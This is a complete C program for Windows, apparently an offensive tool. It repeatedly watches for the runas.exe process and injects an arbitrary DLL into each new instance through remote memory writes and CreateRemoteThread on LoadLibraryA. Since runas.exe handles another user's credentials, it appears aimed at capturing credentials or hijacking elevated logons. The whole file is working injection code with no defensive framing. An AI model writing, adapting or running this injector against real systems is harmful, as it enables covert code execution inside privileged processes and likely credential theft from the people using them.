#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdbool.h>

BOOL InjectDLL(DWORD pid, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[-] Failed to open process %lu.\n", pid);
        return FALSE;
    }

    void* pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteMemory) {
        printf("[-] Failed to allocate memory in process %lu.\n", pid);
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL)) {
        printf("[-] Failed to write DLL path to process memory.\n");
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemoteMemory, 0, NULL);
    if (!hThread) {
        printf("[-] Failed to create remote thread in process %lu.\n", pid);
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    printf("[+] DLL successfully injected into process %lu.\n", pid);
    return TRUE;
}

DWORD GetProcessIdByName(const wchar_t* processName) {
    DWORD processId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe32)) {
            do {
                if (_wcsicmp(processName, pe32.szExeFile) == 0) {
                    processId = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe32));
        }
    }
    CloseHandle(hSnap);
    return processId;
}

int main(int argc, char* argv[]) {
    if (argc != 3 || strcmp(argv[1], "-path") != 0) {
        printf("[!] Usage: %s -path <dll_path>\n", argv[0]);
        return 1;
    }

    const char* dllPath = argv[2];
    DWORD lastInjectedPid = 0;

    while (true) {
        DWORD pid = GetProcessIdByName(L"runas.exe");
        if (pid != 0 && pid != lastInjectedPid) {
            if (InjectDLL(pid, dllPath)) {
                printf("[+] DLL injected into runas.exe (PID: %lu)\n", pid);
                lastInjectedPid = pid;
            }
        }
        Sleep(2000);
    }

    return 0;
}
